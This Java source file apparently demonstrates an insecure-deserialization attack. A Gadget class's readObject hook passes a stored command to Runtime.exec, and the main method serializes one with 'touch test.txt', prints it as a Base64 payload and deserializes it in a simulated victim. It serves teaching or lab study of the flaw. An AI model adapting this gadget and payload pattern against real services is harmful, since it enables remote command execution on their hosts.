import java.io.*;
import java.util.Base64;

class User implements Serializable {
 
    private String username ;

    public User() {
        this.username = "john doe";
    }

    public User(String name){
        this.username = name;
    }

}

class Gadget implements Serializable {
    String command  ;
    public Gadget(String cmd) {
        this.command = cmd ;
    } 
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject(); // Normal deserialization
        Runtime.getRuntime().exec(command); // Boom!
    }
}

public class Exploit {

    private static byte[] genByteArrayOutputStream() throws Exception {
        Gadget gadget = new Gadget("touch test.txt");

        ByteArrayOutputStream bbArrayOutputStream = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bbArrayOutputStream)) {
            oos.writeObject(gadget);
        }

        byte[] payload = bbArrayOutputStream.toByteArray();
        return payload ;
    }

    public static void main(String[] args) throws Exception {

        
        byte[] payload = genByteArrayOutputStream();

        // Print Base64 for easy transport
        System.out.println("Payload (Base64): " + Base64.getEncoder().encodeToString(payload));
        
        // Simulate victim (for testing)
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload))) {
            User u = (User ) ois.readObject(); // Command executes here       
        }

    }
}